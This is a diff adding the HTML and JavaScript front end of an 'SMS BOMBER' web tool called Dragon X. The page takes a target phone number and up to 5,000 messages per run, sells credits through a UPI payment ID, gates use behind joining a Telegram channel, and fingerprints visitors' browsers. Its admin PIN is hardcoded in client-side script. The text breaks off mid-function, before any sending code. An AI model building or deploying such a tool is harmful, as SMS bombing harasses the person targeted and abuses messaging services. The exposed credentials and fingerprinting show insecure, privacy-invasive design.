@@ -1,0 +1,1179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+    <title>🐉 Dragon X · SMS BOMBER v1</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #080808; color: #e0e0e0; font-family: 'Inter', sans-serif; min-height: 100vh; padding: 16px; display: flex; align-items: center; justify-content: center; }
+        .app { max-width: 960px; width: 100%; background: radial-gradient(ellipse at 70% 0%, hsl(0 60% 12%/.25) 0%, transparent 60%), radial-gradient(ellipse at 0% 100%, hsl(220 30% 8%) 0%, hsl(220 25% 5%) 100%); border-radius: 28px; border: 1px solid #1a1a1a; padding: 24px 28px 32px; box-shadow: 0 40px 80px rgba(0, 0, 0, .8); position: relative; overflow: hidden; }
+        .app::before { content: ''; position: absolute; inset: 0; background-image: linear-gradient(hsl(220 15% 92%/.02) 1px, transparent 1px), linear-gradient(90deg, hsl(220 15% 92%/.02) 1px, transparent 1px); background-size: 40px 40px; pointer-events: none; }
+        .header { display: flex; align-items: center; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; position: relative; z-index: 1; }
+        .logo { display: flex; align-items: center; gap: 2px; font-size: 26px; font-weight: 900; letter-spacing: -.02em; user-select: none; }
+        .logo .s { color: #ff3b30; text-shadow: 0 0 20px #ff3b3044; }
+        .logo .a, .logo .m, .logo .o, .logo .x { color: #fff; }
+        .logo .x { position: relative; }
+        .logo .x::after { content: ''; position: absolute; top: -4px; right: -6px; width: 6px; height: 6px; background: #ff3b30; border-radius: 50%; box-shadow: 0 0 12px #ff3b30; animation: pulse-dot 2s infinite; }
+        @keyframes pulse-dot { 0%, 100% { transform: scale(1); opacity: .7; } 50% { transform: scale(1.4); opacity: 1; } }
+        .badge { font-size: 10px; font-weight: 600; color: #facc15; background: #1a1a0a; padding: 4px 12px; border-radius: 100px; border: 1px solid #3a3a1a; }
+        .admin-btn-header { margin-left: auto; background: linear-gradient(135deg, #ff3b30, #c81e1e); border: none; padding: 8px 16px; border-radius: 100px; color: #fff; font-size: 11px; font-weight: 800; cursor: pointer; font-family: 'Inter', sans-serif; letter-spacing: .05em; box-shadow: 0 4px 15px rgba(255,59,48,.3); transition: all .2s; }
+        .admin-btn-header.unlocked { background: linear-gradient(135deg, #4ade80, #22cc77); color: #000; }
+        .tabs { display: flex; gap: 6px; margin-bottom: 14px; flex-wrap: wrap; position: relative; z-index: 1; }
+        .tab { padding: 8px 18px; border-radius: 100px; background: #0d0d0d; border: 1px solid #1a1a1a; color: #666; font-size: 11px; font-weight: 700; cursor: pointer; text-transform: uppercase; letter-spacing: .05em; transition: all .2s; font-family: 'Inter', sans-serif; }
+        .tab.active { background: linear-gradient(135deg, #dc2626, #c2410c); color: #fff; border-color: transparent; box-shadow: 0 4px 15px rgba(220,38,38,.3); }
+        .panel { display: none; }
+        .panel.active { display: block; }
+        .field { margin-bottom: 12px; }
+        .field label { display: block; font-size: 10px; font-weight: 600; text-transform: uppercase; letter-spacing: .06em; color: #555; margin-bottom: 4px; }
+        .field input, .field textarea, .field select { width: 100%; background: #0d0d0d; border: 1px solid #1a1a1a; border-radius: 10px; padding: 10px 12px; color: #ccc; font-size: 12px; font-family: 'Inter', monospace; outline: none; transition: border .2s; }
+        .field input:focus, .field textarea:focus, .field select:focus { border-color: #333; }
+        .field input::placeholder, .field textarea::placeholder { color: #2a2a2a; }
+        .field textarea { min-height: 72px; resize: vertical; }
+        .field select option { background: #0d0d0d; color: #ccc; }
+        .row { display: flex; gap: 12px; flex-wrap: wrap; align-items: flex-end; }
+        .row .field { flex: 1; min-width: 100px; margin-bottom: 0; }
+        .btn-scan { background: linear-gradient(135deg, #dc2626, #c2410c); border: none; padding: 10px 28px; border-radius: 10px; font-weight: 700; font-size: 13px; color: #fff; cursor: pointer; display: flex; align-items: center; gap: 8px; transition: all .2s; box-shadow: 0 4px 20px rgba(220, 38, 38, .25); font-family: 'Inter', sans-serif; flex-shrink: 0; height: 38px; margin-top: 4px; white-space: nowrap; }
+        .btn-scan:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 8px 28px rgba(220, 38, 38, .45); }
+        .btn-scan:disabled { opacity: .5; cursor: not-allowed; }
+        .btn-scan .spinner { width: 16px; height: 16px; border: 2px solid rgba(255, 255, 255, .2); border-top-color: #fff; border-radius: 50%; animation: spin .8s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .status-bar { display: flex; align-items: center; gap: 16px; padding: 10px 14px; background: #0a0a0a; border-radius: 10px; border: 1px solid #141414; margin: 12px 0 10px; flex-wrap: wrap; }
+        .status-bar .stat { font-size: 11px; color: #666; }
+        .status-bar .stat strong { color: #fff; }
+        .status-bar .stat .num { font-weight: 800; }
+        .status-bar .stat .num.green { color: #4ade80; }
+        .status-bar .stat .num.red { color: #ef4444; }
+        .status-bar .stat .num.gold { color: #facc15; }
+        .log { margin-top: 14px; background: #0a0a0a; border-radius: 12px; border: 1px solid #141414; padding: 10px 14px; max-height: 220px; overflow-y: auto; font-family: 'Inter', monospace; font-size: 11px; line-height: 1.7; }
+        .log .entry { display: flex; gap: 8px; align-items: baseline; padding: 1px 0; border-bottom: 1px solid #0d0d0d; }
+        .log .entry:last-child { border-bottom: none; }
+        .log .time { color: #2a2a2a; font-size: 9px; flex-shrink: 0; min-width: 55px; }
+        .log .msg { color: #888; word-break: break-all; }
+        .log .msg.ok { color: #4ade80; }
+        .log .msg.err { color: #ef4444; }
+        .log .msg.info { color: #ff3b30; }
+        .log .msg.warn { color: #facc15; }
+        .footer { margin-top: 16px; font-size: 9px; color: #1a1a1a; text-align: center; border-top: 1px solid #0f0f0f; padding-top: 12px; }
+        .footer span { color: #333; }
+        .db-count-badge { background: #0a1a2a; color: #ff3b30; padding: 2px 12px; border-radius: 100px; font-size: 9px; border: 1px solid #1a2a4a; }
+        .force-join-overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.94); backdrop-filter: blur(12px); border-radius: 28px; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 100; padding: 40px 24px; text-align: center; transition: opacity 0.5s ease, visibility 0.5s ease; }
+        .force-join-overlay.hidden { opacity: 0; visibility: hidden; pointer-events: none; }
+        .force-join-overlay .lock-icon { font-size: 56px; margin-bottom: 16px; animation: pulse-lock 2s infinite; }
+        @keyframes pulse-lock { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
+        .force-join-overlay h2 { font-size: 22px; font-weight: 800; color: #fff; margin-bottom: 8px; }
+        .force-join-overlay p { color: #888; font-size: 14px; max-width: 380px; margin-bottom: 24px; line-height: 1.6; }
+        .force-join-overlay .tg-btn { display: inline-flex; align-items: center; gap: 10px; background: #0088cc; color: #fff; padding: 14px 36px; border-radius: 12px; text-decoration: none; font-weight: 700; font-size: 15px; transition: all .2s; box-shadow: 0 4px 30px rgba(0, 136, 204, .3); margin-bottom: 16px; }
+        .force-join-overlay .check-btn { background: transparent; border: 1px solid #333; color: #888; padding: 8px 24px; border-radius: 8px; cursor: pointer; font-size: 12px; font-family: 'Inter', sans-serif; }
+        .force-join-overlay .status-msg { font-size: 12px; margin-top: 10px; min-height: 20px; color: #facc15; }
+        .force-join-overlay .status-msg.error { color: #ef4444; }
+        .force-join-overlay .status-msg.success { color: #4ade80; }
+        .credit-display { display: flex; align-items: center; gap: 10px; padding: 8px 16px; background: #0a0a0a; border-radius: 10px; border: 1px solid #1a1a1a; margin-bottom: 12px; }
+        .credit-display .credit-icon { font-size: 18px; }
+        .credit-display .credit-count { font-size: 22px; font-weight: 900; color: #facc15; }
+        .credit-display .credit-label { font-size: 10px; color: #555; text-transform: uppercase; letter-spacing: .04em; }
+        .credit-display .credit-status { margin-left: auto; font-size: 10px; color: #666; text-align: right; }
+        .admin-panel { background: #0a0a0a; border: 1px solid #1a1a1a; border-radius: 12px; padding: 16px 20px; margin-top: 12px; display: none; }
+        .admin-panel.visible { display: block; }
+        .admin-panel h4 { color: #facc15; font-size: 12px; font-weight: 700; margin-bottom: 10px; text-transform: uppercase; letter-spacing: .05em; }
+        .admin-panel .admin-row { display: flex; gap: 12px; align-items: center; flex-wrap: wrap; }
+        .admin-panel .admin-row label { font-size: 11px; color: #666; display: flex; align-items: center; gap: 8px; }
+        .admin-panel .admin-row input[type="checkbox"] { width: 18px; height: 18px; accent-color: #ff3b30; cursor: pointer; }
+        .admin-panel .admin-row input[type="text"], .admin-panel .admin-row input[type="number"] { background: #0d0d0d; border: 1px solid #1a1a1a; border-radius: 6px; padding: 6px 10px; color: #ccc; font-size: 11px; font-family: 'Inter', sans-serif; width: 140px; }
+        .admin-panel .admin-row .admin-btn { background: #ff3b30; color: #000; border: none; padding: 6px 16px; border-radius: 6px; font-size: 10px; font-weight: 700; cursor: pointer; font-family: 'Inter', sans-serif; }
+        .admin-panel .admin-row .admin-btn.danger { background: #ef4444; color: #fff; }
+        .admin-panel .admin-row .admin-btn.success { background: #4ade80; color: #000; }
+        .admin-panel .user-list { margin-top: 10px; max-height: 400px; overflow-y: auto; font-size: 10px; border-top: 1px solid #141414; padding-top: 10px; }
+        .user-item { display: flex; justify-content: space-between; align-items: center; gap: 8px; padding: 8px 10px; border-bottom: 1px solid #0d0d0d; font-size: 10px; color: #888; border-radius: 6px; flex-wrap: wrap; }
+        .user-item:hover { background: #0f0f0f; }
+        .user-item .user-id { color: #888; font-family: monospace; font-size: 10px; }
+        .user-item .user-credits { color: #facc15; font-weight: 700; }
+        .user-item .user-status { font-size: 8px; padding: 1px 8px; border-radius: 100px; }
+        .user-item .user-status.verified { color: #4ade80; background: #0a1a0a; }
+        .user-item .user-status.unverified { color: #ef4444; background: #1a0a0a; }
+        .user-item .ubtn { padding: 4px 10px; border-radius: 5px; border: none; font-size: 9px; font-weight: 700; cursor: pointer; font-family: 'Inter', sans-serif; }
+        .user-item .ubtn.add { background: #4ade80; color: #000; }
+        .user-item .ubtn.rem { background: #ef4444; color: #fff; }
+        .user-item .ubtn.bc { background: #0088cc; color: #fff; }
+        .pending-item { display: flex; gap: 10px; padding: 12px; background: #0d0d0d; border: 1px solid #1a1a1a; border-radius: 10px; margin-bottom: 8px; align-items: center; flex-wrap: wrap; }
+        .pending-item .pi-info { flex: 1; min-width: 200px; font-size: 11px; color: #888; line-height: 1.6; }
+        .pending-item .pi-info strong { color: #fff; }
+        .pending-item .pi-info code { color: #ff3b30; font-family: monospace; word-break: break-all; }
+        .pending-item .pi-actions { display: flex; gap: 6px; flex-shrink: 0; }
+        .pending-item .pi-actions button { padding: 8px 14px; border: none; border-radius: 6px; font-size: 10px; font-weight: 700; cursor: pointer; font-family: 'Inter', sans-serif; }
+        .pending-item .pi-actions .approve { background: #4ade80; color: #000; }
+        .pending-item .pi-actions .reject { background: #ef4444; color: #fff; }
+        .pending-empty { color: #333; font-size: 11px; padding: 12px; text-align: center; border: 1px dashed #1a1a1a; border-radius: 10px; }
+        .upi-box { padding: 18px; background: #0d0d0d; border: 1px solid #1a1a1a; border-radius: 14px; text-align: center; margin-bottom: 14px; }
+        .upi-box .qr { width: 200px; height: 200px; margin: 0 auto 12px; background: #fff; border-radius: 10px; padding: 10px; display: flex; align-items: center; justify-content: center; }
+        .upi-box .qr img { max-width: 100%; max-height: 100%; }
+        .upi-box .upi-id { font-family: monospace; color: #ff3b30; font-size: 15px; font-weight: 700; letter-spacing: 1px; padding: 8px 16px; background: #080808; border-radius: 8px; border: 1px solid #1a1a1a; display: inline-block; margin-bottom: 8px; }
+        .upi-box .upi-name { color: #666; font-size: 11px; }
+        .upi-box .amount-info { color: #facc15; font-size: 12px; font-weight: 700; margin-top: 10px; }
+        .packages { display: grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap: 8px; margin-bottom: 14px; }
+        .pkg { padding: 14px 10px; background: #0d0d0d; border: 1px solid #1a1a1a; border-radius: 12px; text-align: center; cursor: pointer; transition: all .2s; }
+        .pkg:hover { border-color: #ff3b30; transform: translateY(-2px); }
+        .pkg.selected { border-color: #ff3b30; background: #1a0808; box-shadow: 0 0 20px rgba(255,59,48,.2); }
+        .pkg .pkg-credits { font-size: 22px; font-weight: 900; color: #facc15; }
+        .pkg .pkg-label { font-size: 9px; color: #666; text-transform: uppercase; letter-spacing: .06em; margin-top: 2px; }
+        .pkg .pkg-price { font-size: 13px; font-weight: 700; color: #ff3b30; margin-top: 6px; }
+        .admin-modal { position: fixed; inset: 0; background: rgba(0,0,0,.9); backdrop-filter: blur(8px); z-index: 200; display: none; align-items: center; justify-content: center; padding: 20px; }
+        .admin-modal.visible { display: flex; }
+        .admin-modal .box { background: #0d0d0d; border: 1px solid #2a2a2a; border-radius: 16px; padding: 28px; max-width: 380px; width: 100%; text-align: center; box-shadow: 0 20px 60px rgba(255,59,48,.2); }
+        .admin-modal .box h3 { color: #ff3b30; font-size: 16px; margin-bottom: 8px; font-weight: 800; }
+        .admin-modal .box p { color: #666; font-size: 12px; margin-bottom: 16px; }
+        .admin-modal .box input { width: 100%; background: #080808; border: 1px solid #1a1a1a; border-radius: 10px; padding: 12px 14px; color: #fff; font-size: 13px; outline: none; margin-bottom: 12px; font-family: 'Inter', sans-serif; text-align: center; letter-spacing: 1px; }
+        .admin-modal .box input:focus { border-color: #ff3b30; }
+        .admin-modal .box button { background: linear-gradient(135deg, #ff3b30, #c81e1e); border: none; padding: 12px 32px; border-radius: 10px; color: #fff; font-weight: 700; font-size: 13px; cursor: pointer; width: 100%; margin-bottom: 8px; font-family: 'Inter', sans-serif; }
+        .admin-modal .box .close-btn { background: transparent; border: 1px solid #333; color: #666; padding: 8px; font-size: 11px; }
+        .admin-modal .box .err { color: #ef4444; font-size: 11px; min-height: 16px; margin-top: 4px; }
+        .scanner-modal { position: fixed; inset: 0; background: rgba(0,0,0,.95); backdrop-filter: blur(8px); z-index: 300; display: none; align-items: center; justify-content: center; padding: 20px; }
+        .scanner-modal.visible { display: flex; }
+        .scanner-modal .box { background: #0d0d0d; border: 1px solid #2a2a2a; border-radius: 16px; padding: 20px; max-width: 500px; width: 100%; }
+        .scanner-modal .box h3 { color: #ff3b30; font-size: 15px; margin-bottom: 12px; text-align: center; }
+        #qrReader { width: 100%; border-radius: 10px; overflow: hidden; background: #000; }
+        #qrReader video { width: 100% !important; border-radius: 10px; }
+        .scanner-modal .box button { background: transparent; border: 1px solid #333; color: #888; padding: 10px; border-radius: 10px; font-size: 12px; cursor: pointer; width: 100%; margin-top: 12px; font-family: 'Inter', sans-serif; }
+    </style>
+</head>
+<body>
+
+    <div class="app" id="app">
+        <div class="force-join-overlay" id="forceJoinOverlay">
+            <div class="lock-icon">🐉</div>
+            <h2>Join Channel & Get 2 Free Credits!</h2>
+            <p>Join our official Telegram channel to unlock the tool and get <strong>2 FREE CREDITS</strong> (10,000 SMS)!</p>
+            <a href="https://t.me/Dragon_X_king1" target="_blank" class="tg-btn">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21.5 4.5L2 13.5l7.5 3.5L13 21l3.5-10.5L21.5 4.5z"/><path d="M13 21l3.5-10.5L21.5 4.5"/></svg>
+                Join Channel
+            </a>
+            <button class="check-btn" id="verifyJoinBtn">✅ I've Joined — Claim 2 Free Credits</button>
+            <div class="status-msg" id="joinStatusMsg">🐉 Join channel & get 2 free credits!</div>
+        </div>
+
+        <div class="header">
+            <div class="logo"><span class="s">D</span><span class="a">R</span><span class="m">A</span><span class="o">G</span><span class="x">O</span><span class="s">N</span><span class="x">X</span><span style="margin-left:6px;font-size:24px;">🐉</span></div>
+            <button class="admin-btn-header" id="adminHeaderBtn">👑 ADMIN</button>
+            <span class="db-count-badge" id="dbCountBadge">📡 0 DBs</span>
+        </div>
+
+        <div class="credit-display">
+            <span class="credit-icon">💎</span>
+            <span class="credit-count" id="creditCount">0</span>
+            <span class="credit-label">Credits</span>
+            <span class="credit-status" id="creditStatus">⚡ 1 Credit = 5000 SMS</span>
+        </div>
+
+        <div class="tabs">
+            <div class="tab active" data-panel="bomber">🎯 BOMBER</div>
+            <div class="tab" data-panel="recharge">💳 RECHARGE</div>
+        </div>
+
+        <div class="panel active" id="panel-bomber">
+            <div class="field">
+                <label>📱 Target Number</label>
+                <input id="targetNumber" type="text" placeholder="Enter phone number with country code" />
+            </div>
+            <div class="field">
+                <label>✉️ Message</label>
+                <textarea id="messageText" placeholder="Type your message here…"></textarea>
+            </div>
+            <div class="row">
+                <div class="field">
+                    <label>🔑 Secret Key</label>
+                    <input id="secretKey" type="text" placeholder="Your Firebase secret" />
+                </div>
+                <div class="field">
+                    <label>📦 Quantity</label>
+                    <select id="quantitySelect">
+                        <option value="50">50</option>
+                        <option value="100">100</option>
+                        <option value="200">200</option>
+                        <option value="500">500</option>
+                        <option value="1000">1,000</option>
+                        <option value="2500">2,500</option>
+                        <option value="5000" selected>5,000</option>
+                    </select>
+                </div>
+                <div class="field">
+                    <label>⚡ Mode</label>
+                    <select id="speedSelect">
+                        <option value="turbo">🔥 TURBO</option>
+                        <option value="slow">🐢 Slow</option>
+                    </select>
+                </div>
+                <button class="btn-scan" id="sendBtn"><span>🚀</span> BOMB</button>
+            </div>
+        </div>
+
+        <div class="panel" id="panel-recharge">
+            <h3 style="font-size: 12px; color: #facc15; text-transform: uppercase; margin-bottom: 10px;">💳 Buy Credits</h3>
+            <div class="packages">
+                <div class="pkg" data-credits="5" data-price="10"><div class="pkg-credits">5</div><div class="pkg-label">Credits</div><div class="pkg-price">₹10</div></div>
+                <div class="pkg" data-credits="15" data-price="25"><div class="pkg-credits">15</div><div class="pkg-label">Credits</div><div class="pkg-price">₹25</div></div>
+                <div class="pkg" data-credits="35" data-price="50"><div class="pkg-credits">35</div><div class="pkg-label">Credits</div><div class="pkg-price">₹50</div></div>
+                <div class="pkg" data-credits="80" data-price="100"><div class="pkg-credits">80</div><div class="pkg-label">Credits</div><div class="pkg-price">₹100</div></div>
+            </div>
+            <div class="upi-box">
+                <div class="qr" id="qrBox"><div style="color:#000;font-size:12px;">📱 Generating QR...</div></div>
+                <div class="upi-id" id="upiIdDisplay">cyberxst@ybl</div>
+                <div class="upi-name">Pay to: vipin</div>
+                <div class="amount-info" id="amountInfo">Select a package above</div>
+            </div>
+            <button class="btn-scan" id="scanQrBtn" style="width:100%;justify-content:center;height:44px;margin-bottom:8px;">📷 SCAN & PAY</button>
+            <div class="field">
+                <label>🔢 Transaction ID / UTR</label>
+                <input id="txnIdInput" type="text" placeholder="Enter 12-digit UTR / Txn ID" />
+            </div>
+            <button class="btn-scan" id="submitPaymentBtn" style="width:100%;justify-content:center;height:44px;">✅ SUBMIT PAYMENT PROOF</button>
+        </div>
+
+        <div class="admin-panel" id="adminPanel">
+            <h4>🔐 Admin Panel — @Dragon_X_1</h4>
+            <div class="admin-row">
+                <label><input type="checkbox" id="systemOnOff" checked /> System: <span id="systemStatusLabel">ON</span></label>
+                <label style="font-size:11px;">User ID: <input type="text" id="targetUserId" placeholder="user ID" style="width:140px;" /></label>
+                <label style="font-size:11px;">Credits: <input type="number" id="adminCreditAmount" value="1" min="1" style="width:70px;" />
+                    <button class="admin-btn success" id="adminAddCreditsBtn">+ Add</button>
+                    <button class="admin-btn danger" id="adminRemoveCreditsBtn">- Remove</button>
+                </label>
+            </div>
+            <div style="margin-top:6px;display:flex;gap:12px;flex-wrap:wrap;font-size:10px;color:#444;">
+                <span>👤 Users: <strong id="userCount" style="color:#fff;">0</strong></span>
+                <span>💎 Credits: <strong id="totalCredits" style="color:#facc15;">0</strong></span>
+                <span>🔄 Your ID: <strong id="currentUserIdDisplay" style="color:#ff3b30;font-family:monospace;">-</strong></span>
+            </div>
+            <h4 style="margin-top:16px;">🎟️ Redeem Code Generator</h4>
+            <div class="admin-row">
+                <label style="font-size:11px;">Credits per code: <input type="number" id="redeemCreditsInput" value="10" min="1" max="9999" style="width:80px;" /></label>
+                <button class="admin-btn success" id="genRedeemCodeBtn">🎟️ Generate Code</button>
+            </div>
+            <div id="generatedCodesList" style="margin-top:10px;max-height:200px;overflow-y:auto;font-size:11px;"></div>
+            <h4 style="margin-top:16px;">💰 Pending Payments <span id="pendingCount" style="color:#ff3b30;">(0)</span></h4>
+            <div id="pendingPaymentsList"><div class="pending-empty">No pending payments</div></div>
+            <h4 style="margin-top:16px;">👥 All Users</h4>
+            <div class="user-list" id="userList"><div style="color:#333;font-size:10px;padding:4px 0;">No users yet</div></div>
+            <div style="margin-top:12px;border-top:1px solid #141414;padding-top:10px;">
+                <button class="admin-btn" id="adminLogoutBtn" style="background:#333;color:#888;">🔓 Lock Admin Panel</button>
+            </div>
+        </div>
+
+        <div class="status-bar" id="statusBar" style="display:none;">
+            <div class="stat">📱 Devices: <strong id="onlineCount">0</strong></div>
+            <div class="stat">✅ Sent: <span class="num green" id="sentCount">0</span></div>
+            <div class="stat">❌ Fail: <span class="num red" id="failCount">0</span></div>
+            <div class="stat">🔄 Round: <span class="num gold" id="roundCount">0</span></div>
+            <div class="stat" style="margin-left:auto;">⏳ <strong id="progressText">Idle</strong></div>
+        </div>
+
+        <div class="log" id="log"><div class="entry"><span class="time">──</span><span class="msg" style="color:#333;">🐉 Dragon X · Daily 2 free credits · Owner: @Dragon_X_1</span></div></div>
+
+        <div style="margin-top:20px;display:flex;gap:10px;flex-wrap:wrap;">
+            <a href="https://t.me/Dragon_X_1" target="_blank" style="flex:1;min-width:180px;display:flex;align-items:center;justify-content:center;gap:8px;padding:14px 20px;background:linear-gradient(135deg,#0088cc,#0066a3);border-radius:12px;color:#fff;text-decoration:none;font-size:13px;font-weight:800;letter-spacing:.5px;box-shadow:0 6px 20px rgba(0,136,204,.3);text-transform:uppercase;">
+                📩 Contact Admin @Dragon_X_1
+            </a>
+            <button onclick="showRedeemModal()" style="flex:1;min-width:180px;display:flex;align-items:center;justify-content:center;gap:8px;padding:14px 20px;background:linear-gradient(135deg,#facc15,#d4a017);border:none;border-radius:12px;color:#000;font-size:13px;font-weight:800;letter-spacing:.5px;cursor:pointer;box-shadow:0 6px 20px rgba(250,204,21,.3);text-transform:uppercase;font-family:'Inter',sans-serif;">
+                🎟️ Redeem Code
+            </button>
+        </div>
+
+        <div class="footer"><span>⚡ 1 Credit = 5,000 SMS · Daily 2 free · Admin: @Dragon_X_1</span></div>
+    </div>
+
+    <div class="admin-modal" id="adminModal">
+        <div class="box">
+            <h3>🔐 ADMIN ACCESS</h3>
+            <p id="adminModalSubtitle">Step 1: Enter admin username</p>
+            <div id="adminStep1">
+                <input type="text" id="adminUsernameInput" placeholder="@username" autocomplete="off" />
+                <button id="adminNextBtn">Next →</button>
+            </div>
+            <div id="adminStep2" style="display:none;">
+                <input type="password" id="adminPinInput" placeholder="🔑 Enter PIN" inputmode="numeric" maxlength="10" autocomplete="off" />
+                <button id="adminUnlockBtn">🔓 Unlock Panel</button>
+            </div>
+            <button class="close-btn" id="adminCloseBtn">Cancel</button>
+            <div class="err" id="adminErr"></div>
+        </div>
+    </div>
+
+    <div class="scanner-modal" id="scannerModal">
+        <div class="box">
+            <h3>📷 Scan UPI QR to Pay</h3>
+            <div id="qrReader"></div>
+            <button id="scannerCloseBtn">Close</button>
+        </div>
+    </div>
+
+    <div class="admin-modal" id="redeemModal" style="z-index: 250;">
+        <div class="box">
+            <h3>🎟️ REDEEM CODE</h3>
+            <p>Enter your redeem code to get credits</p>
+            <input type="text" id="redeemCodeInput" placeholder="DragonXXXXXXXX" autocomplete="off" style="text-transform:uppercase;font-family:monospace;letter-spacing:2px;" />
+            <button id="redeemSubmitBtn">✅ Redeem Now</button>
+            <button class="close-btn" onclick="hideRedeemModal()">Cancel</button>
+            <div class="err" id="redeemErr"></div>
+        </div>
+    </div>
+
+    <script src="https://unpkg.com/html5-qrcode@2.3.8/html5-qrcode.min.js"></script>
+    <script>
+        const ADMIN_USERNAME = "Dragon_X_1";
+        const ADMIN_PIN = "72330";
+        const ADMIN_UNLOCK_KEY = "dragon_admin_unlocked";
+        const UPI_ID = "cyberxst@ybl";
+        const UPI_NAME = "vipin";
+        const CHANNEL_USERNAME = "Dragon_X_king1";
+        const CHANNEL_URL = "https://t.me/Dragon_X_king1";
+        const CREDIT_KEY = "dragon_credits";
+        const SYSTEM_KEY = "dragon_system_on";
+        const VERIFIED_KEY = "dragon_verified";
+        const FREE_CREDITS_KEY = "dragon_free_credits_given";
+        const PAYMENTS_KEY = "dragon_payments";
+        const BROADCAST_KEY = "dragon_broadcast";
+        const DAILY_LIMIT_KEY = "dragon_daily_limit";
+        const REDEEM_CODES_KEY = "dragon_redeem_codes";
+        const USER_ID_KEY = "dragon_user_id_permanent";
+        const DAILY_CREDIT_LIMIT = 2;
+        const SMS_PER_CREDIT = 5000;
+        const FREE_CREDITS = 2;
+
+        let userCredits = 0;
+        let isSystemOn = true;
+        let isVerified = false;
+        let freeCreditsGiven = false;
+        let isAdmin = false;
+        let selectedPackage = null;
+
+        function isAdminUnlocked() { return localStorage.getItem(ADMIN_UNLOCK_KEY) === "true"; }
+
+        function getUserId() {
+            let userId = localStorage.getItem(USER_ID_KEY);
+            if (userId) return userId;
+            const ua = navigator.userAgent || '';
+            const lang = navigator.language || '';
+            const platform = navigator.platform || '';
+            const screenSize = (screen.width || 0) + 'x' + (screen.height || 0) + 'x' + (screen.colorDepth || 0);
+            const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
+            const hc = navigator.hardwareConcurrency || 0;
+            const dm = navigator.deviceMemory || 0;
+            const tzOffset = new Date().getTimezoneOffset();
+            const fingerprint = `${ua}|${lang}|${platform}|${screenSize}|${tz}|${hc}|${dm}|${tzOffset}`;
+            let hash = 0;
+            for (let i = 0; i < fingerprint.length; i++) {
+                hash = ((hash << 5) - hash) + fingerprint.charCodeAt(i);
+                hash |= 0;
+            }
+            userId = 'dragon_' + Math.abs(hash).toString(36) + '_' + (screen.width || 0) + 'x' + (screen.height || 0);
+            localStorage.setItem(USER_ID_KEY, userId);
+            if (!localStorage.getItem('dragon_user_id')) {
+                localStorage.setItem('dragon_user_id', userId);
+            }
+            return userId;
+        }
+
+        document.getElementById('adminHeaderBtn').addEventListener('click', function() {
+            if (isAdminUnlocked() && isAdmin) {
+                isAdmin = false;
+                document.getElementById('adminPanel').classList.remove('visible');
+                this.classList.remove('unlocked');
+                this.textContent = '👑 ADMIN';
+            } else if (isAdminUnlocked()) {
+                isAdmin = true;
+                document.getElementById('adminPanel').classList.add('visible');
+                this.classList.add('unlocked');
+                this.textContent = '👑 ON';
+                updateCreditDisplay();
+                loadPendingPayments();
+            } else {
+                showAdminModal();
+            }
+        });
+
+        function showAdminModal() {
+            document.getElementById('adminModal').classList.add('visible');
+            document.getElementById('adminUsernameInput').value = '';
+            document.getElementById('adminPinInput').value = '';
+            document.getElementById('adminStep1').style.display = 'block';
+            document.getElementById('adminStep2').style.display = 'none';
+            document.getElementById('adminModalSubtitle').textContent = 'Step 1: Enter admin username';
+            document.getElementById('adminErr').textContent = '';
+        }
+
+        function hideAdminModal() { document.getElementById('adminModal').classList.remove('visible'); }
+
+        function adminNextStep() {
+            const input = document.getElementById('adminUsernameInput').value.trim().replace('@', '');
+            if (input.toLowerCase() === ADMIN_USERNAME.toLowerCase()) {
+                document.getElementById('adminStep1').style.display = 'none';
+                document.getElementById('adminStep2').style.display = 'block';
+                document.getElementById('adminModalSubtitle').textContent = 'Step 2: Enter admin PIN';
+                document.getElementById('adminPinInput').focus();
+                document.getElementById('adminErr').textContent = '';
+            } else { document.getElementById('adminErr').textContent = '❌ Wrong username'; }
+        }
+
+        function unlockAdmin() {
+            const pin = document.getElementById('adminPinInput').value.trim();
+            if (pin === ADMIN_PIN) {
+                localStorage.setItem(ADMIN_UNLOCK_KEY, 'true');
+                isAdmin = true;
+                hideAdminModal();
+                document.getElementById('adminPanel').classList.add('visible');
+                const btn = document.getElementById('adminHeaderBtn');
+                btn.classList.add('unlocked');
+                btn.textContent = '👑 ON';
+                updateCreditDisplay();
+                loadPendingPayments();
+                renderGeneratedCodes();
+                log(`✅ Admin unlocked as @${ADMIN_USERNAME}`, 'ok');
+            } else {
+                document.getElementById('adminErr').textContent = '❌ Wrong PIN';
+                document.getElementById('adminPinInput').value = '';
+            }
+        }
+
+        document.getElementById('adminNextBtn').addEventListener('click', adminNextStep);
+        document.getElementById('adminUnlockBtn').addEventListener('click', unlockAdmin);
+        document.getElementById('adminCloseBtn').addEventListener('click', hideAdminModal);
+        document.getElementById('adminUsernameInput').addEventListener('keypress', e => { if (e.key === 'Enter') adminNextStep(); });
+        document.getElementById('adminPinInput').addEventListener('keypress', e => { if (e.key === 'Enter') unlockAdmin(); });
+
+        document.getElementById('adminLogoutBtn').addEventListener('click', function() {
+            localStorage.removeItem(ADMIN_UNLOCK_KEY);
+            isAdmin = false;
+            document.getElementById('adminPanel').classList.remove('visible');
+            const btn = document.getElementById('adminHeaderBtn');
+            btn.classList.remove('unlocked');
+            btn.textContent = '👑 ADMIN';
+            log('🔓 Admin locked', 'info');
+        });
+
+        document.querySelectorAll('.tab').forEach(tab => {
+            tab.addEventListener('click', () => {
+                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+                document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+                tab.classList.add('active');
+                document.getElementById('panel-' + tab.dataset.panel).classList.add('active');
+            });
+        });
+
+        function loadCreditData() {
+            try {
+                const saved = localStorage.getItem(CREDIT_KEY);
+                const userId = getUserId();
+                if (saved) {
+                    const data = JSON.parse(saved);
+                    if (data[userId] !== undefined) userCredits = data[userId];
